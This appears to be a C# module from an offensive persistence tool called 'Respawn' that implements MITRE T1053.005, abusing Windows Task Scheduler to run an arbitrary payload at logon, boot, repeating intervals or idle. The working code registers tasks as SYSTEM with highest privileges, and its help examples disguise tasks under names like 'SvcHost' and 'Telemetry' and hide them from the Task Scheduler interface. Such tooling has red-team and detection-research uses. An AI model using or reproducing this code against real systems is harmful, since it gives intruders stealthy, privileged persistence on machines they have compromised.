using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using Microsoft.Win32.TaskScheduler;
using System.Security.Principal;

namespace Respawn.Techniques.Scheduler
{
    public class SchedulerModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "task";
        public string Name        => "Scheduled Tasks";
        public string Mitre       => "T1053.005";
        public string Description => "Persist by abusing the Windows Task Scheduler to automatically execute a payload based on specific system events, such as system boot, user logon, repeating time intervals, or system idle states.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "triggers");

            // 2. EXECUTION LOGIC
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  EXECUTION LOGIC:");
            // Console.ResetColor();
            // Console.WriteLine("    - Use '-tr' to define events (logon, boot, idle, interval)");
            // Console.WriteLine("    - Use '-u SYSTEM' for highest privileges (Requires Admin)");
            // Console.WriteLine("    - Use '-hi' to hide task from Taskschd.msc UI");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Name of the task (e.g. 'SvcHost')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the executable");
            TechniqueHelpBuilder.RenderOption("-tr, --trigger", "Trigger ID (logon, boot, interval, idle)");
            TechniqueHelpBuilder.RenderOption("-i,  --interval", "Duration (e.g. '5m', '1h') - for interval only");
            TechniqueHelpBuilder.RenderOption("-u,  --user", "Run as specific user (e.g. 'SYSTEM')");
            TechniqueHelpBuilder.RenderOption("-hi, --hidden", "Set the 'Hidden' attribute on the task");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t task -a list-triggers");
            TechniqueHelpBuilder.RenderExample("Respawn -t task -a install -n \"SvcHost\" -p \"C:\\p.exe\" -tr logon -u SYSTEM");
            TechniqueHelpBuilder.RenderExample("Respawn -t task -a install -n \"Telemetry\" -p \"C:\\p.exe\" -tr interval -i 30m -hi");
            TechniqueHelpBuilder.RenderExample("Respawn -t task -a verify  -n \"SvcHost\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t task -a remove  -n \"SvcHost\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("triggers", StringComparison.OrdinalIgnoreCase))
                return SchedulerTriggers.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var triggerDef = SchedulerTriggers.GetById(ctx.Trigger);
            if (triggerDef == null)
                return TechniqueResult.Fail($"Unknown trigger '{ctx.Trigger}'. Use -a list-triggers to see available triggers.");

            try
            {
                using var ts = new TaskService();

                if (ts.GetTask(ctx.Name) != null)
                    return TechniqueResult.Exists($"Task '{ctx.Name}' already exists.");

                var td = ts.NewTask();
                td.RegistrationInfo.Description        = ctx.Name;
                td.RegistrationInfo.Author             = Environment.UserName;
                td.Settings.Hidden                     = ctx.Hidden;
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries     = false;

                // ── Principal ────────────────────────────────────────────────────
                bool isBootTrigger = ctx.Trigger.Equals("boot", StringComparison.OrdinalIgnoreCase);

                if (isBootTrigger)
                {
                    td.Principal.UserId    = "SYSTEM";
                    td.Principal.LogonType = TaskLogonType.ServiceAccount;
                    td.Principal.RunLevel  = TaskRunLevel.Highest;
                }
                else
                {
                    td.Principal.UserId    = WindowsIdentity.GetCurrent().Name;
                    td.Principal.LogonType = TaskLogonType.InteractiveToken;
                    if (IsAdmin())
                        td.Principal.RunLevel = TaskRunLevel.Highest;
                }

                // ── Trigger ──────────────────────────────────────────────────────
                switch (ctx.Trigger.ToLower())
                {
                    case "logon":
                        var logonTrigger = new LogonTrigger();
                        if (!string.IsNullOrEmpty(ctx.User) &&
                            ctx.User.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                        {
                            logonTrigger.UserId        = null;
                            td.Principal.UserId        = "SYSTEM";
                            td.Principal.LogonType     = TaskLogonType.ServiceAccount;
                            td.Principal.RunLevel      = TaskRunLevel.Highest;
                        }
                        else
                        {
                            logonTrigger.UserId = WindowsIdentity.GetCurrent().Name;
                        }
                        td.Triggers.Add(logonTrigger);
                        break;

                    case "boot":
                        td.Triggers.Add(new BootTrigger());
                        break;

                    case "interval":
                        if (string.IsNullOrEmpty(ctx.Interval))
                            return TechniqueResult.Fail("Interval trigger requires -i <value> (e.g. 5m, 1h, 1d).");
                        var duration = ParseInterval(ctx.Interval);
                        if (duration == TimeSpan.Zero)
                            return TechniqueResult.Fail($"Invalid interval value '{ctx.Interval}'. Use format: 5m, 1h, 1d.");
                        td.Triggers.Add(new TimeTrigger
                        {
                            StartBoundary = DateTime.Now.AddMinutes(1),
                            Repetition    = { Interval = duration, StopAtDurationEnd = false }
                        });
                        break;

                    case "idle":
                        td.Triggers.Add(new IdleTrigger());
                        td.Settings.RunOnlyIfIdle             = true;
                        td.Settings.IdleSettings.IdleDuration = TimeSpan.FromMinutes(10);
                        td.Settings.IdleSettings.WaitTimeout  = TimeSpan.FromHours(1);
                        break;
                }

                // ── Action ───────────────────────────────────────────────────────
                td.Actions.Add(new ExecAction(ctx.Payload));

                // ── Register ─────────────────────────────────────────────────────
                if (isBootTrigger || (ctx.Trigger.Equals("logon", StringComparison.OrdinalIgnoreCase)
                                && !string.IsNullOrEmpty(ctx.User)
                                && ctx.User.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase)))
                {
                    ts.RootFolder.RegisterTaskDefinition(ctx.Name, td);
                }
                else
                {
                    ts.RootFolder.RegisterTaskDefinition(
                        ctx.Name,
                        td,
                        TaskCreation.CreateOrUpdate,
                        WindowsIdentity.GetCurrent().Name,
                        null,
                        TaskLogonType.InteractiveToken
                    );
                }

                return TechniqueResult.Ok($"Installed task '{ctx.Name}' -> '{ctx.Payload}' with trigger '{ctx.Trigger}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Boot trigger requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var ts = new TaskService();

                if (ts.GetTask(ctx.Name) == null)
                    return TechniqueResult.NotFound($"Task '{ctx.Name}' not found.");

                ts.RootFolder.DeleteTask(ctx.Name);
                return TechniqueResult.Ok($"Removed task '{ctx.Name}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var ts = new TaskService();

                var task = ts.GetTask(ctx.Name);
                if (task == null)
                    return TechniqueResult.NotFound($"Task '{ctx.Name}' not found.");

                string payload = task.Definition.Actions
                    .OfType<ExecAction>()
                    .FirstOrDefault()?.Path ?? "unknown";

                string trigger = task.Definition.Triggers
                    .FirstOrDefault()?.TriggerType.ToString() ?? "unknown";

                return TechniqueResult.Ok($"Verified task '{ctx.Name}' -> '{payload}' trigger '{trigger}' state '{task.State}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Trigger))
            {
                error = "No trigger specified. Use -tr <trigger-id> or see -a list-triggers.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private bool IsAdmin()
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal      = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private TimeSpan ParseInterval(string interval)
        {
            if (string.IsNullOrEmpty(interval) || interval.Length < 2)
                return TimeSpan.Zero;

            string unit  = interval[^1].ToString().ToLower();
            string value = interval[..^1];

            if (!int.TryParse(value, out int amount))
                return TimeSpan.Zero;

            return unit switch
            {
                "m" => TimeSpan.FromMinutes(amount),
                "h" => TimeSpan.FromHours(amount),
                "d" => TimeSpan.FromDays(amount),
                _   => TimeSpan.Zero
            };
        }
    }
}